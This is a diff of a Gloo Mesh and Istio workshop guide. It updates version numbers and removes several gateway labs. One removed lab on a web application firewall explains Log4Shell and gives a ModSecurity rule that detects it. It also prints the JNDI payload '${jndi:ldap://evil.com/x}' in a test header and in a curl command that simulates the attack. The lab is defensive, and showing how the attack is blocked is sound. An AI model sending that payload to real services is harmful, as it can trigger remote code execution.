@@ -31,10 +31,6 @@ source ./scripts/assert.sh
 * [Lab 15 - Expose an external service](#Lab-15)
 * [Lab 16 - Deploy Keycloak](#Lab-16)
 * [Lab 17 - Securing the access with OAuth](#Lab-17)
-* [Lab 18 - Use the JWT filter to create headers from claims](#Lab-18)
-* [Lab 19 - Use the transformation filter to manipulate headers](#Lab-19)
-* [Lab 20 - Apply rate limiting to the Gateway](#Lab-20)
-* [Lab 21 - Use the Web Application Firewall filter](#Lab-21)
 
 
 
@@ -153,10 +149,10 @@ kubectl config use-context ${MGMT}
 
 We are going to deploy Istio using Helm, but there are several other options. You can find more information in the [Istio documentation](https://istio.io/latest/docs/setup/install/).
 
-First of all, let's Download the Istio release 1.13.4:
+First of all, let's Download the Istio release 1.14.0:
 
 ```bash
-export ISTIO_VERSION=1.13.4
+export ISTIO_VERSION=1.14.0
 curl -L https://istio.io/downloadIstio | sh -
 ```
 
@@ -169,10 +165,10 @@ chai.use(chaiExec);
 
 describe("istioctl version", () => {
   it("version should be correct", () => {
-    let cli = chaiExec('./istio-1.13.4/bin/istioctl version --remote=false');
+    let cli = chaiExec('./istio-1.14.0/bin/istioctl version --remote=false');
 
     expect(cli).to.exit.with.code(0);
-    expect(cli).stdout.to.contain("1.13.4");
+    expect(cli).stdout.to.contain("1.14.0");
     expect(cli).stderr.to.be.empty;
   });
 });
@@ -191,17 +187,15 @@ kubectl --context ${CLUSTER1} create ns istio-gateways
 Now, let's deploy the Istio control plane on the first cluster:
 
 ```bash
-helm --kube-context=${CLUSTER1} upgrade --install istio-base ./istio-1.13.4/manifests/charts/base -n istio-system --set defaultRevision=1-13
+helm --kube-context=${CLUSTER1} upgrade --install istio-base ./istio-1.14.0/manifests/charts/base -n istio-system --set defaultRevision=1-14
 
-helm --kube-context=${CLUSTER1} upgrade --install istio-1.13.4 ./istio-1.13.4/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF
-revision: 1-13
+helm --kube-context=${CLUSTER1} upgrade --install istio-1.14.0 ./istio-1.14.0/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF
+revision: 1-14
 global:
   meshID: mesh1
   multiCluster:
     clusterName: cluster1
   network: network1
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
 meshConfig:
   trustDomain: cluster1
   accessLogFile: /dev/stdout
@@ -227,12 +221,10 @@ Note that we set the `trust domain` to be the same as the cluster name and we co
 After that, you can deploy the gateway(s):
 
 ```bash
-kubectl --context ${CLUSTER1} label namespace istio-gateways istio.io/rev=1-13
+kubectl --context ${CLUSTER1} label namespace istio-gateways istio.io/rev=1-14
 
-helm --kube-context=${CLUSTER1} upgrade --install istio-ingressgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
+helm --kube-context=${CLUSTER1} upgrade --install istio-ingressgateway ./istio-1.14.0/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
+
 gateways:
   istio-ingressgateway:
     name: istio-ingressgateway
@@ -249,10 +241,8 @@ gateways:
       targetPort: 8443
 EOF
 
-helm --kube-context=${CLUSTER1} upgrade --install istio-eastwestgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
+helm --kube-context=${CLUSTER1} upgrade --install istio-eastwestgateway ./istio-1.14.0/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
+
 gateways:
   istio-ingressgateway:
     name: istio-eastwestgateway
@@ -309,17 +299,15 @@ kubectl --context ${CLUSTER2} create ns istio-gateways
 Now, let's deploy the Istio control plane on the second cluster:
 
 ```bash
-helm --kube-context=${CLUSTER2} upgrade --install istio-base ./istio-1.13.4/manifests/charts/base -n istio-system --set defaultRevision=1-13
+helm --kube-context=${CLUSTER2} upgrade --install istio-base ./istio-1.14.0/manifests/charts/base -n istio-system --set defaultRevision=1-14
 
-helm --kube-context=${CLUSTER2} upgrade --install istio-1.13.4 ./istio-1.13.4/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF
-revision: 1-13
+helm --kube-context=${CLUSTER2} upgrade --install istio-1.14.0 ./istio-1.14.0/manifests/charts/istio-control/istio-discovery -n istio-system --values - <<EOF
+revision: 1-14
 global:
   meshID: mesh1
   multiCluster:
     clusterName: cluster2
   network: network1
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
 meshConfig:
   trustDomain: cluster2
   accessLogFile: /dev/stdout
@@ -343,12 +331,10 @@ EOF
 After that, you can deploy the gateways:
 
 ```bash
-kubectl --context ${CLUSTER2} label namespace istio-gateways istio.io/rev=1-13
+kubectl --context ${CLUSTER2} label namespace istio-gateways istio.io/rev=1-14
 
-helm --kube-context=${CLUSTER2} upgrade --install istio-ingressgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
+helm --kube-context=${CLUSTER2} upgrade --install istio-ingressgateway ./istio-1.14.0/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
+
 gateways:
   istio-ingressgateway:
     name: istio-ingressgateway
@@ -365,10 +351,8 @@ gateways:
       targetPort: 8443
 EOF
 
-helm --kube-context=${CLUSTER2} upgrade --install istio-eastwestgateway ./istio-1.13.4/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
-global:
-  hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
-  tag: 1.13.4-solo
+helm --kube-context=${CLUSTER2} upgrade --install istio-eastwestgateway ./istio-1.14.0/manifests/charts/gateways/istio-ingress -n istio-gateways --values - <<EOF
+
 gateways:
   istio-ingressgateway:
     name: istio-eastwestgateway
@@ -416,7 +400,7 @@ afterEach(function (done) {
 });
 
 describe("Checking Istio installation", function() {
-  let deployments = ["istiod-1-13"];
+  let deployments = ["istiod-1-14"];
   deployments.forEach(deploy => {
     it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-system", k8sObj: deploy }));
   });
@@ -424,7 +408,7 @@ describe("Checking Istio installation", function() {
   deployments.forEach(deploy => {
     it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER1, () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "istio-gateways", k8sObj: deploy }));
   });
-  deployments = ["istiod-1-13"];
+  deployments = ["istiod-1-14"];
   deployments.forEach(deploy => {
     it(deploy + ' pods are ready in cluster ' + process.env.CLUSTER2, () => helpers.checkDeployment({ context: process.env.CLUSTER2, namespace: "istio-system", k8sObj: deploy }));
   });
@@ -542,8 +526,8 @@ Run the following commands to deploy the bookinfo application on `cluster1`:
 kubectl --context ${CLUSTER1} create ns bookinfo-frontends
 kubectl --context ${CLUSTER1} create ns bookinfo-backends
 curl https://raw.githubusercontent.com/istio/istio/release-1.13/samples/bookinfo/platform/kube/bookinfo.yaml > bookinfo.yaml
-kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-13
-kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-13
+kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-14
+kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-14
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
@@ -583,8 +567,8 @@ Now, run the following commands to deploy the bookinfo application on `cluster2`
 ```bash
 kubectl --context ${CLUSTER2} create ns bookinfo-frontends
 kubectl --context ${CLUSTER2} create ns bookinfo-backends
-kubectl --context ${CLUSTER2} label namespace bookinfo-frontends istio.io/rev=1-13
-kubectl --context ${CLUSTER2} label namespace bookinfo-backends istio.io/rev=1-13
+kubectl --context ${CLUSTER2} label namespace bookinfo-frontends istio.io/rev=1-14
+kubectl --context ${CLUSTER2} label namespace bookinfo-backends istio.io/rev=1-14
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
@@ -750,7 +734,7 @@ spec:
       labels:
         app: in-mesh
         version: v1
-        istio.io/rev: 1-13
+        istio.io/rev: 1-14
     spec:
       serviceAccountName: in-mesh
       containers:
@@ -799,7 +783,7 @@ mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
 First of all, let's install the `meshctl` CLI:
 
 ```bash
-export GLOO_MESH_VERSION=v2.0.5
+export GLOO_MESH_VERSION=v2.0.6
 curl -sL https://run.solo.io/meshctl/install | sh -
 export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
@@ -842,7 +826,7 @@ helm repo update
 kubectl --context ${MGMT} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT} \
---version=2.0.5 \
+--version=2.0.6 \
 --set glooMeshMgmtServer.ports.healthcheck=8091 \
 --set glooMeshUi.serviceType=LoadBalancer \
 --set mgmtClusterName=${MGMT} \
@@ -938,7 +922,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster1 \
-  --version 2.0.5
+  --version 2.0.6
 ```
 
 Note that the registration can also be performed using `meshctl cluster register`.
@@ -973,7 +957,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster2 \
-  --version 2.0.5
+  --version 2.0.6
 ```
 
 You can check the cluster(s) have been registered correctly using the following commands:
@@ -1021,9 +1005,9 @@ First, you need to create a namespace for the addons, with Istio injection enabl
 
 ```bash
 kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
-kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-13
+kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-14
 kubectl --context ${CLUSTER2} create namespace gloo-mesh-addons
-kubectl --context ${CLUSTER2} label namespace gloo-mesh-addons istio.io/rev=1-13
+kubectl --context ${CLUSTER2} label namespace gloo-mesh-addons istio.io/rev=1-14
 ```
 
 Then, you can deploy the addons on the cluster(s) using Helm:
@@ -1035,7 +1019,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.0.5
+  --version 2.0.6
 
 helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --namespace gloo-mesh-addons \
@@ -1043,7 +1027,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.0.5
+  --version 2.0.6
 ```
 
 Finally, you need to specify which gateways you want to use for cross cluster traffic:
@@ -3218,563 +3202,5 @@ If you open the browser in incognito and login using the username `user2` and th
 This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `extauth` Pod to authorize the request):
 
 ![Gloo Mesh Gateway Extauth](images/steps/gateway-extauth-oauth/gloo-mesh-gateway-extauth.svg)
-
-
-
-## Lab 18 - Use the JWT filter to create headers from claims <a name="Lab-18"></a>
-
-
-In this step, we're going to validate the JWT token and to create a new header from the `email` claim.
-
-Keycloak is running outside of the Service Mesh, so we need to define an `ExternalService` and its associated `ExternalEndpoint`:
-
-Let's start by the latter:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: ExternalEndpoint
-metadata:
-  name: keycloak
-  namespace: httpbin
-  labels:
-    host: keycloak
-spec:
-  address: ${HOST_KEYCLOAK}
-  ports:
-  - name: http
-    number: ${PORT_KEYCLOAK}
-EOF
-```
-
-Then we can create the former:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: ExternalService
-metadata:
-  name: keycloak
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-  - keycloak
-  ports:
-  - name: http
-    number: ${PORT_KEYCLOAK}
-    protocol: HTTP
-  selector:
-    host: keycloak
-EOF
-```
-
-Now, we can create a `JWTPolicy` to extract the claim.
-
-Create the policy:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: security.policy.gloo.solo.io/v2
-kind: JWTPolicy
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        oauth: "true"
-  config:
-    phase:
-      postAuthz:
-        priority: 1
-    providers:
-      keycloak:
-        issuer: ${KEYCLOAK_URL}/realms/master
-        tokenSource:
-          headers:
-          - name: jwt
-        remote:
-          url: ${KEYCLOAK_URL}/realms/master/protocol/openid-connect/certs
-          destinationRef:
-            kind: EXTERNAL_SERVICE
-            ref:
-              name: keycloak
-            port:
-              number: ${PORT_KEYCLOAK}
-        claimsToHeaders:
-        - claim: email
-          header: X-Email
-EOF
-```
-
-You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).
-
-If you refresh the web page, you should see a new `X-Email` header added to the request with the value `user2@solo.io`
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Claim to header is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Email": "user2@solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-default/build/templates/steps/apps/httpbin/gateway-jwt/tests/header-added.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
-
-## Lab 19 - Use the transformation filter to manipulate headers <a name="Lab-19"></a>
-
-
-In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:
-
-Let's create a `TransformationPolicy` to extract the claim.
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: trafficcontrol.policy.gloo.solo.io/v2
-kind: TransformationPolicy
-metadata:
-  name: modify-header
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        oauth: "true"
-  config:
-    phase:
-      postAuthz:
-        priority: 2
-    request:
-      injaTemplate:
-        extractors:
-          organization:
-            header: 'X-Email'
-            regex: '.*@(.*)$'
-            subgroup: 1
-        headers:
-          x-organization:
-            text: "{{ organization }}"
-EOF
-```
-
-You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).
-
-If you refresh the web page, you should see a new `X-Organization` header added to the request with the value `solo.io`
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Tranformation is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The new header has been added', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: '"X-Organization": "solo.io"' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-default/build/templates/steps/apps/httpbin/gateway-transformation/tests/header-added.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-
-
-## Lab 20 - Apply rate limiting to the Gateway <a name="Lab-20"></a>
-
-
-In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
-
-First, we need to create a `RateLimitClientConfig` object to define the descriptors:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: trafficcontrol.policy.gloo.solo.io/v2
-kind: RateLimitClientConfig
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  raw:
-    rateLimits:
-    - setActions:
-      - requestHeaders:
-          descriptorKey: organization
-          headerName: X-Organization
-EOF
-```
-
-Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: RateLimitServerConfig
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  destinationServers:
-  - ref:
-      cluster: cluster1
-      name: rate-limiter
-      namespace: gloo-mesh-addons
-    port:
-      name: grpc
-  raw:
-    setDescriptors:
-      - simpleDescriptors:
-          - key: organization
-            value: solo.io
-        rateLimit:
-          requestsPerUnit: 3
-          unit: MINUTE
-EOF
-```
-
-After that, we need to create a `RateLimitPolicy` object to define the descriptors:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: trafficcontrol.policy.gloo.solo.io/v2
-kind: RateLimitPolicy
-metadata:
-  name: httpbin
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        ratelimited: "true"
-  config:
-    serverSettings:
-      name: rate-limit-server
-      namespace: httpbin
-      cluster: cluster1
-    ratelimitClientConfig:
-      name: httpbin
-      namespace: httpbin
-      cluster: cluster1
-    ratelimitServerConfig:
-      name: httpbin
-      namespace: httpbin
-      cluster: cluster1
-    phase:
-      postAuthz:
-        priority: 3
-EOF
-```
-
-We also need to create a `RateLimitServerSettings`, which is a CRD that define which extauth server to use: 
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: admin.gloo.solo.io/v2
-kind: RateLimitServerSettings
-metadata:
-  name: rate-limit-server
-  namespace: httpbin
-spec:
-  destinationServer:
-    ref:
-      cluster: cluster1
-      name: rate-limiter
-      namespace: gloo-mesh-addons
-    port:
-      name: grpc
-EOF
-```
-
-Finally, you need to update the `RouteTable` to use this `RateLimitPolicy`:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: httpbin
-      labels:
-        oauth: "true"
-        ratelimited: "true"
-      matchers:
-      - uri:
-          exact: /get
-      - uri:
-          prefix: /callback
-      forwardTo:
-        destinations:
-        - ref:
-            name: in-mesh
-            namespace: httpbin
-          port:
-            number: 8000
-EOF
-```
-
-Refresh the web page multiple times.
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Rate limiting is working properly", function() {
-  let user = 'user2';
-  let password = 'password';
-  let keycloak_client_id = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get extauthpolicy httpbin -o jsonpath='{.spec.config.glooAuth.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl --context " + process.env.CLUSTER1 + " -n httpbin get secret oauth -o jsonpath='{.data.client-secret}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii');
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "' + process.env.KEYCLOAK_URL +'/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('The httpbin page should be rate limited', () => helpersHttp.checkURL({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-default/build/templates/steps/apps/httpbin/gateway-ratelimiting/tests/rate-limited.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-You should get a `200` response code the first 3 time and a `429` response code after.
-
-This diagram shows the flow of the request (with the Istio ingress gateway leveraging the `rate limiter` Pod to determine if the request should be allowed):
-
-![Gloo Mesh Gateway Rate Limiting](images/steps/gateway-ratelimiting/gloo-mesh-gateway-rate-limiting.svg)
-
-Let's apply the original `RouteTable` yaml:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: httpbin
-      matchers:
-      - uri:
-          exact: /get
-      forwardTo:
-        destinations:
-        - ref:
-            name: in-mesh
-            namespace: httpbin
-          port:
-            number: 8000
-EOF
-```
-
-And also delete the different objects we've created:
-
-```bash
-kubectl --context ${CLUSTER1} -n httpbin delete ratelimitpolicy httpbin
-kubectl --context ${CLUSTER1} -n httpbin delete ratelimitclientconfig httpbin
-kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
-kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserversettings rate-limit-server
-```
-
-
-
-
-## Lab 21 - Use the Web Application Firewall filter <a name="Lab-21"></a>
-
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
-
-An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers. 
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-Create the WAF policy:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<'EOF'
-apiVersion: security.policy.gloo.solo.io/v2
-kind: WAFPolicy
-metadata:
-  name: log4shell
-  namespace: httpbin
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        waf: "true"
-  config:
-    disableCoreRuleSet: true
-    customInterventionMessage: 'Log4Shell malicious payload'
-    customRuleSets:
-    - ruleStr: |
-        SecRuleEngine On
-        SecRequestBodyAccess On
-        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
-          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
-          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-Finally, you need to update the `RouteTable` to use this `AuthConfig`:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: httpbin
-      labels:
-        waf: "true"
-      matchers:
-      - uri:
-          exact: /get
-      forwardTo:
-        destinations:
-        - ref:
-            name: in-mesh
-            namespace: httpbin
-          port:
-            number: 8000
-EOF
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: 'https://' + process.env.ENDPOINT_HTTPS_GW_CLUSTER1, path: '/get', headers: [{key: 'x-my-header', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-
-EOF
-echo "executing test dist/gloo-mesh-2-0-default/build/templates/steps/apps/httpbin/gateway-waf/tests/waf.test.js.liquid"
-mocha ./test.js --timeout 5000 --retries=50 --bail 2> /dev/null || exit 1
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get -i
-```
-
-The request should be rejected:
-
-```
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Let's apply the original `RouteTable` yaml:
-
-```bash
-kubectl --context ${CLUSTER1} apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: RouteTable
-metadata:
-  name: httpbin
-  namespace: httpbin
-  labels:
-    expose: "true"
-spec:
-  hosts:
-    - '*'
-  virtualGateways:
-    - name: north-south-gw
-      namespace: istio-gateways
-      cluster: cluster1
-  workloadSelectors: []
-  http:
-    - name: httpbin
-      matchers:
-      - uri:
-          exact: /get
-      forwardTo:
-        destinations:
-        - ref:
-            name: in-mesh
-            namespace: httpbin
-          port:
-            number: 8000
-EOF
-```
-
-And also delete the waf policy we've created:
-
-```bash
-kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
-```
 
 
